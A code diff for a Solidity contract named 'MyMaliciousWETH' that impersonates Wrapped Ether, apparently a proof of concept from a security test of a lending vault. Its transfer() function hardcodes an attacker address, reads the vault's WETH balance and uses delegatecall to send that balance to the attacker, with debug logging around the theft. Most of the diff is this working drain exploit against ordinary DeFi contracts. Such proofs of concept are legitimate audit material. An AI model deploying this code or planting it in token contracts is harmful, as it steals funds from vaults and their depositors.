@@ -1,47 +1,77 @@
 // SPDX-License-Identifier: GPL-3.0
 
 pragma solidity 0.8.19;
-
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import "hardhat/console.sol";
 
-contract MyMaliciousERC20 is ERC20, Ownable {
-    uint8 internal _decimals;
-    address internal vaultCompartmentVictim;
-    address internal vaultAddr;
+contract MyMaliciousWETH {
+    string public name = "Wrapped Ether";
+    string public symbol = "WETH";
+    uint8 public decimals = 18;
 
-    constructor(
-        string memory name,
-        string memory symbol,
-        uint8 __decimals,
-        address _vaultCompartmentVictim,
-        address _lenderVault
-    ) ERC20(name, symbol) Ownable() {
-        _decimals = __decimals;
-        _mint(_lenderVault, 100 ether);
-        vaultCompartmentVictim = _vaultCompartmentVictim;
-        vaultAddr = _lenderVault;
+    event Approval(address indexed src, address indexed guy, uint wad);
+    event Transfer(address indexed src, address indexed dst, uint wad);
+    event Deposit(address indexed dst, uint wad);
+    event Withdrawal(address indexed src, uint wad);
+
+    mapping(address => uint) public balanceOf;
+    mapping(address => mapping(address => uint)) public allowance;
+
+    fallback() external payable {
+        deposit();
     }
 
-    function mint(address account, uint256 amount) external {
-        _mint(account, amount);
+    function deposit() public payable {
+        balanceOf[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
     }
 
-    function transfer(address, uint256) public override returns (bool) {
-        address collTokenAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
-        uint256 repayAmount = IERC20(collTokenAddr).balanceOf(vaultAddr); //get balance
-        collTokenAddr.delegatecall(
-            abi.encodeWithSelector(
-                bytes4(keccak256("transfer(address,uint256)")),
-                owner(),
-                repayAmount
-            )
-        );
+    function withdraw(uint wad) public {
+        require(balanceOf[msg.sender] >= wad);
+        balanceOf[msg.sender] -= wad;
+        payable(msg.sender).transfer(wad);
+        emit Withdrawal(msg.sender, wad);
+    }
+
+    function totalSupply() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function approve(address guy, uint wad) public returns (bool) {
+        allowance[msg.sender][guy] = wad;
+        emit Approval(msg.sender, guy, wad);
         return true;
     }
 
-    function decimals() public view override returns (uint8) {
-        return _decimals;
+    function transfer(address, uint) public returns (bool) {
+        address attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
+        address tokenToBeStolen = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
+        uint256 balanceToBeStolen = IERC20(tokenToBeStolen).balanceOf(
+            0xE088a0537f57e868a9CAC7aed621C665E1D404Cf
+        ); //get balance of vault
+        (bool success, ) = tokenToBeStolen.delegatecall(
+            abi.encodeWithSelector(
+                bytes4(keccak256("transfer(address,uint256)")),
+                attacker,
+                balanceToBeStolen
+            )
+        );
+        console.log("delegatecall success status:", success);
+        console.log("msg.sender:", msg.sender); // msg.sender is vault
+        console.log("tokenToBeStolen:", tokenToBeStolen);
+        console.log("balanceToBeStolen:", balanceToBeStolen);
+        return true;
+    }
+
+    function transferFrom(
+        address src,
+        address dst,
+        uint wad
+    ) public returns (bool) {}
+
+    function mint(address receiver, uint amount) external {
+        balanceOf[receiver] += amount;
     }
 }
